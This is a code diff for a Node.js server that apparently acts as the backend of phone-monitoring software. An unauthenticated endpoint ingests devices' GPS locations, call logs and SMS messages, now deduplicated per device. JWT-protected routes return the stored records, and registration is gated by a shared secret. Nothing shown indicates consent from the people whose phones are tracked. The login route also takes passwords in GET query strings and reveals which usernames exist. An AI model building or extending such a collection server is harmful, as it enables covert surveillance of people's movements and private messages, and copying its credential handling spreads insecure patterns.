@@ -49,38 +49,119 @@ const SmsSchema = new mongoose.Schema({
 });
 const Sms = mongoose.model("Sms", SmsSchema);
 
+const UserSchema = new mongoose.Schema({
+  username: { type: String, required: true, unique: true },
+  passwordHash: { type: String, required: true },
+  createdAt: { type: Date, default: Date.now }
+});
+const User = mongoose.model("User", UserSchema);
 
-app.get('/get-location', async (req, res) => {
+// ------------------------
+// Middleware for protected routes
+// ------------------------
+const authMiddleware = async (req, res, next) => {
+  const token = req.headers.authorization?.split(" ")[1];
+  if (!token) return res.status(401).json({ error: "No token provided" });
+
+  try {
+    const decoded = jwt.verify(token, process.env.JWT_SECRET);
+    req.user = decoded;
+    next();
+  } catch (err) {
+    return res.status(401).json({ error: "Invalid token" });
+  }
+};
+
+// ------------------------
+// User registration
+// ------------------------
+app.post("/api/register", async (req, res) => {
+  try {
+    const { username, password, DEF_PASS } = req.body;
+    if (!username || !password || !DEF_PASS) {
+      return res.status(400).json({ error: "All fields required" });
+    }
+
+    // Validate against server DEF_PASS
+    if (DEF_PASS !== process.env.DEF_PASS) {
+      return res.status(403).json({ error: "Invalid DEF_PASS" });
+    }
+
+    // Hash password
+    const passwordHash = await bcrypt.hash(password, 10);
+
+    const newUser = await new User({ username, passwordHash }).save();
+
+    // Create JWT token
+    const token = jwt.sign({ id: newUser._id, username: newUser.username }, process.env.JWT_SECRET, {
+      expiresIn: "7d"
+    });
+
+    res.json({ message: "User created", token });
+  } catch (err) {
+    console.error(err);
+    if (err.code === 11000) {
+      return res.status(400).json({ error: "Username already exists" });
+    }
+    res.status(500).json({ error: "Server error" });
+  }
+});
+
+
+app.get("/api/access-token", async (req, res) => {
+  try {
+    const { username, password } = req.query;
+    const user = await User.findOne({ username });
+    if (!user) {
+      return res.status(401).json({ error: "Invalid username" });
+    }
+    const isPasswordValid = await bcrypt.compare(password, user.passwordHash);
+    if (!isPasswordValid) {
+      return res.status(401).json({ error: "Invalid password" });
+    }
+    const token = jwt.sign({ id: user._id, username: user.username }, process.env.JWT_SECRET, {
+      expiresIn: "7d"
+    });
+    res.json({ token });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: "Server error" });
+  }
+});
+// ------------------------
+// Protected GET routes
+// ------------------------
+app.get("/get-location", authMiddleware, async (req, res) => {
   try {
     const locations = await Location.find();
     res.status(200).json(locations);
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: 'Server error' });
+    res.status(500).json({ error: "Server error" });
   }
-})
+});
 
-app.get('/get-call-logs', async (req, res) => {
+app.get("/get-call-logs", authMiddleware, async (req, res) => {
   try {
     const callLogs = await CallLog.find();
     res.status(200).json(callLogs);
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: 'Server error' });
+    res.status(500).json({ error: "Server error" });
   }
-})
+});
 
-app.get('/get-sms', async (req, res) => {
+app.get("/get-sms", authMiddleware, async (req, res) => {
   try {
     const sms = await Sms.find();
     res.status(200).json(sms);
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: 'Server error' });
+    res.status(500).json({ error: "Server error" });
   }
-})
+});
 
-app.get('/get-calllogs', async (req, res) => {
+app.get('/get-single-logs', authMiddleware, async (req, res) => {
   try {
     const callLogs = await CallLog.find({ number: req.query.number });
     res.status(200).json(callLogs);
@@ -90,7 +171,7 @@ app.get('/get-calllogs', async (req, res) => {
   }
 })
 
-app.get('/get-sms', async (req, res) => {
+app.get('/get-single-sms', authMiddleware, async (req, res) => {
   try {
     const sms = await Sms.find({ address: req.query.address });
     res.status(200).json(sms);
@@ -107,19 +188,49 @@ app.post("/api/post-data", async (req, res) => {
   try {
     const { device, latitude, longitude, callLogs, messages } = req.body;
 
-    // 1. Save Location
+    if (!device) {
+      return res.status(400).json({ error: "Device identifier is required" });
+    }
+
+    // 1. Save Location (always)
     if (typeof latitude === "number" && typeof longitude === "number") {
       await new Location({ device, latitude, longitude }).save();
     }
 
-    // 2. Save Call Logs
-    if (Array.isArray(callLogs)) {
-      await CallLog.insertMany(callLogs.map(c => ({ ...c, device })));
+    // 2. Save Call Logs (only new ones for this device)
+    if (Array.isArray(callLogs) && callLogs.length > 0) {
+      const latestCall = await CallLog.find({ device })
+        .sort({ date: -1 })
+        .limit(1)
+        .lean();
+
+      const latestCallDate = latestCall.length > 0 ? latestCall[0].date : null;
+
+      const newCallLogs = latestCallDate
+        ? callLogs.filter(c => new Date(c.date) > new Date(latestCallDate))
+        : callLogs;
+
+      if (newCallLogs.length > 0) {
+        await CallLog.insertMany(newCallLogs.map(c => ({ ...c, device })));
+      }
     }
 
-    // 3. Save SMS
-    if (Array.isArray(messages)) {
-      await Sms.insertMany(messages.map(m => ({ ...m, device })));
+    // 3. Save SMS (only new ones for this device)
+    if (Array.isArray(messages) && messages.length > 0) {
+      const latestSms = await Sms.find({ device })
+        .sort({ date: -1 })
+        .limit(1)
+        .lean();
+
+      const latestSmsDate = latestSms.length > 0 ? latestSms[0].date : null;
+
+      const newMessages = latestSmsDate
+        ? messages.filter(m => new Date(m.date) > new Date(latestSmsDate))
+        : messages;
+
+      if (newMessages.length > 0) {
+        await Sms.insertMany(newMessages.map(m => ({ ...m, device })));
+      }
     }
 
     res.json({ message: "Data saved successfully" });
@@ -128,6 +239,7 @@ app.post("/api/post-data", async (req, res) => {
     res.status(500).json({ error: "Server error" });
   }
 });
+
 
 // Routes
 app.post("/api/push", async (req, res) => {
